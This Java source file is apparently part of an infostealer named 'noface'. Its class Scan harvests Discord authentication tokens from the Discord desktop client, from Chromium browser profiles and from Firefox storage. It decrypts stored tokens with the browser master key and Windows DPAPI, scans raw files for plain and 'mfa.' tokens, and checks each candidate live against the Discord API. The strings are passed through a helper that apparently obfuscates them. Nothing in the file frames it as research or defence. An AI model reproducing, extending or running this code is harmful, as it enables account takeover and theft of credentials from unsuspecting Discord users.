package noface.sync;

import noface.browsers.Aes;
import noface.browsers.Copy;
import noface.browsers.Key;
import noface.config.S;

import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;
import java.util.stream.Stream;

public final class Scan {

    private static final int MAX_CHECK = 40;

    static {
        try {
            Class.forName("org.sqlite.JDBC");
        } catch (ClassNotFoundException ignored) {}
    }

    public static List<String> all() {
        Set<String> desk = new LinkedHashSet<>();
        Set<String> other = new LinkedHashSet<>();

        for (Paths.Install inst : Paths.installs()) {
            if (!Files.isDirectory(inst.base())) continue;
            byte[] mk = Key.master(inst.localState());
            walk(inst.ldb(), mk, null, desk);
            walk(inst.base().resolve(S.e("Session Storage")), mk, null, desk);
            walkIndex(inst.base().resolve(S.e("IndexedDB")), mk, null, desk);
        }

        scanChromium(other);
        scanFirefox(other);

        List<String> ordered = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();
        for (String t : desk) offer(t, seen, ordered);
        for (String t : other) offer(t, seen, ordered);

        List<String> valid = new ArrayList<>();
        int n = 0;
        for (String clean : ordered) {
            if (!shape(clean)) continue;
            if (n >= MAX_CHECK) break;
            n++;
            if (quickCheck(clean)) valid.add(clean);
        }
        return valid;
    }

    private static void offer(String t, Set<String> seen, List<String> out) {
        if (t == null || t.length() < 50) return;
        String clean = t.trim().replace("\"", "").replace("'", "");
        if (clean.length() < 50) return;
        String key = clean.length() > 40 ? clean.substring(0, 40) : clean;
        if (!seen.add(key)) return;
        out.add(clean);
    }

    private static boolean shape(String token) {
        if (token.startsWith(S.e("mfa."))) return token.length() >= 80;
        int d1 = token.indexOf('.');
        if (d1 < 18) return false;
        int d2 = token.indexOf('.', d1 + 1);
        if (d2 < 0) return false;
        if (token.indexOf('.', d2 + 1) >= 0) return false;
        int n0 = d1;
        int n1 = d2 - d1 - 1;
        int n2 = token.length() - d2 - 1;
        if (n0 < 18 || n1 < 5 || n1 > 10 || n2 < 25) return false;
        try {
            String s = token.substring(0, d1).replace('-', '+').replace('_', '/');
            int pad = (4 - (s.length() % 4)) % 4;
            if (pad > 0) s = s + "=".repeat(pad);
            String id = new String(Base64.getDecoder().decode(s), StandardCharsets.UTF_8);
            if (id.length() < 17 || id.length() > 20) return false;
            for (int i = 0; i < id.length(); i++) {
                if (!Character.isDigit(id.charAt(i))) return false;
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private static boolean quickCheck(String token) {
        for (int attempt = 0; attempt < 3; attempt++) {
            try {
                if (attempt > 0) Thread.sleep(1500L * attempt);
                HttpURLConnection c = (HttpURLConnection) URI.create(
                        S.e("https://discord.com/api/v9") + S.e("/users/@me")
                ).toURL().openConnection();
                c.setRequestMethod("GET");
                c.setConnectTimeout(8000);
                c.setReadTimeout(8000);
                c.setRequestProperty(S.e("Authorization"), token);
                c.setRequestProperty(S.e("User-Agent"), S.e("Mozilla/5.0"));
                c.setRequestProperty(S.e("Content-Type"), S.e("application/json"));
                int code = c.getResponseCode();
                try {
                    (code >= 200 && code < 300 ? c.getInputStream() : c.getErrorStream()).readAllBytes();
                } catch (Exception ignored) {}
                if (code == 429) continue;
                return code >= 200 && code < 300;
            } catch (Exception e) {
                if (attempt >= 2) return false;
            }
        }
        return false;
    }

    private static void scanChromium(Set<String> out) {
        try {
            for (noface.browsers.Paths.Def b : noface.browsers.Paths.all()) {
                if (!b.chromium() || !Files.isDirectory(b.userData())) continue;
                byte[] mk = Key.master(b.localState());
                String[] profs = {
                        S.e("Default"), S.e("Profile 1"), S.e("Profile 2"),
                        S.e("Profile 3"), S.e("Profile 4"), S.e("Profile 5")
                };
                for (String prof : profs) {
                    Path dir = b.userData().resolve(prof);
                    if (!Files.isDirectory(dir)) continue;
                    walk(dir.resolve(S.e("Local Storage")).resolve(S.e("leveldb")), mk, null, out);
                    walk(dir.resolve(S.e("Session Storage")), mk, null, out);
                    walkIndex(dir.resolve(S.e("IndexedDB")), mk, null, out);
                }
            }
        } catch (Exception ignored) {}
    }

    private static void scanFirefox(Set<String> out) {
        try {
            String appData = System.getenv(S.e("APPDATA"));
            if (appData == null) return;
            Path root = Path.of(appData, S.e("Mozilla"), S.e("Firefox"), S.e("Profiles"));
            if (!Files.isDirectory(root)) return;
            try (Stream<Path> dirs = Files.list(root)) {
                dirs.filter(Files::isDirectory).forEach(p -> {
                    Path db = p.resolve(S.e("webappsstore.sqlite"));
                    if (Files.isRegularFile(db)) readFxDb(db, out);
                });
            }
        } catch (Exception ignored) {}
    }

    private static void readFxDb(Path db, Set<String> out) {
        byte[] raw = Copy.bytes(db);
        if (raw == null) return;
        noface.browsers.Db.query(raw, S.e("SELECT value FROM webappsstore2 WHERE originAttributes LIKE '%discord.com%' OR scope LIKE '%discord%'"),
                rs -> {
                    try {
                        String val = rs.getString(1);
                        if (val != null) plain(val, out);
                    } catch (Exception ignored) {}
                });
    }

    private static void walkIndex(Path root, byte[] mk, byte[] abe, Set<String> out) {
        if (!Files.isDirectory(root)) return;
        try (Stream<Path> dirs = Files.list(root)) {
            dirs.filter(Files::isDirectory).forEach(d -> {
                String n = d.getFileName().toString().toLowerCase();
                if (n.contains(S.e("discord"))) walk(d, mk, abe, out);
            });
        } catch (Exception ignored) {}
    }

    private static void walk(Path dir, byte[] mk, byte[] abe, Set<String> out) {
        if (!Files.isDirectory(dir)) return;
        try (Stream<Path> stream = Files.list(dir)) {
            stream.filter(p -> {
                String n = p.getFileName().toString().toLowerCase();
                return n.endsWith(".log") || n.endsWith(".ldb") || n.endsWith(".sst")
                        || n.equals("log") || n.equals("log.old") || n.equals("current");
            }).forEach(p -> readFile(p, mk, abe, out));
        } catch (Exception ignored) {}
    }

    private static void readFile(Path file, byte[] mk, byte[] abe, Set<String> out) {
        byte[] raw = Copy.bytes(file);
        if (raw == null || raw.length == 0 || raw.length > 20_000_000) return;

        for (String text : views(raw)) {
            if (text == null || text.isEmpty()) continue;
            pullEnc(text, mk, abe, out);
            plain(text, out);
        }
    }

    private static void pullEnc(String text, byte[] mk, byte[] abe, Set<String> out) {
        String mark = S.e("dQw4w9WgXcQ:");
        int from = 0;
        while (from < text.length()) {
            int i = text.indexOf(mark, from);
            if (i < 0) break;
            int s = i + mark.length();
            int e = s;
            while (e < text.length() && e - s < 220 && b64c(text.charAt(e))) e++;
            if (e - s >= 80) {
                String plain = unlock(text.substring(s, e), mk, abe);
                if (plain != null && !plain.isEmpty()) {
                    plain = plain.trim().replace("\"", "").replace("'", "");
                    if (plain.length() >= 50) out.add(plain);
                }
            }
            from = s + 1;
        }
    }

    private static boolean b64c(char c) {
        return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z')
                || (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=' || c == '-' || c == '_';
    }

    private static String unlock(String b64, byte[] mk, byte[] abe) {
        byte[] enc = decode(b64);
        if (enc == null || enc.length < 16) return null;
        String a = Aes.decrypt(enc, mk, abe);
        if (a != null && !a.isEmpty()) return a;
        if (abe != null) {
            String b = Aes.decrypt(enc, mk, null);
            if (b != null && !b.isEmpty()) return b;
        }
        byte[] dp = noface.browsers.Dpapi.unprotect(enc);
        if (dp != null && dp.length > 0) return new String(dp, StandardCharsets.UTF_8);
        return null;
    }

    private static byte[] decode(String b64) {
        String s = b64.replace('-', '+').replace('_', '/');
        int pad = (4 - (s.length() % 4)) % 4;
        if (pad > 0) s = s + "=".repeat(pad);
        try {
            return Base64.getDecoder().decode(s);
        } catch (Exception e) {
            return null;
        }
    }

    private static void plain(String text, Set<String> out) {
        String mfa = S.e("mfa.");
        int from = 0;
        while (from < text.length()) {
            int i = text.indexOf(mfa, from);
            if (i < 0) break;
            int e = i + mfa.length();
            while (e < text.length() && e - i < 140 && tokc(text.charAt(e))) e++;
            if (e - i >= 80) out.add(text.substring(i, e));
            from = i + 1;
        }

        int n = text.length();
        for (int i = 0; i < n; i++) {
            if (!tokc(text.charAt(i))) continue;
            if (i > 0 && tokc(text.charAt(i - 1))) continue;
            int j = i;
            while (j < n && tokc(text.charAt(j))) j++;
            int len = j - i;
            if (len < 55 || len > 200) {
                i = j;
                continue;
            }
            String cand = text.substring(i, j);
            if (cand.indexOf('.') > 0 && shape(cand)) out.add(cand);
            else if (quotedAround(text, i, j)) out.add(cand);
            i = j;
        }
    }

    private static boolean quotedAround(String text, int i, int j) {
        if (i <= 0 || j >= text.length()) return false;
        char a = text.charAt(i - 1);
        char b = text.charAt(j);
        return (a == '"' || a == '\'') && (b == '"' || b == '\'');
    }

    private static boolean tokc(char c) {
        return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z')
                || (c >= '0' && c <= '9') || c == '_' || c == '-' || c == '.';
    }

    private static List<String> views(byte[] raw) {
        List<String> out = new ArrayList<>(3);
        out.add(new String(raw, StandardCharsets.ISO_8859_1));
        String stripped = stripNull(raw);
        if (!stripped.isEmpty() && !stripped.equals(out.get(0))) out.add(stripped);
        if ((raw.length & 1) == 0) {
            String mark = S.e("dQw4w9WgXcQ");
            String u16 = new String(raw, StandardCharsets.UTF_16LE);
            if (u16.indexOf(mark) >= 0 || u16.indexOf('.') > 0) out.add(u16);
        }
        return out;
    }

    private static String stripNull(byte[] raw) {
        StringBuilder sb = new StringBuilder(raw.length);
        for (byte b : raw) {
            if (b != 0) sb.append((char) (b & 0xFF));
        }
        return sb.toString();
    }

    private Scan() {}
}
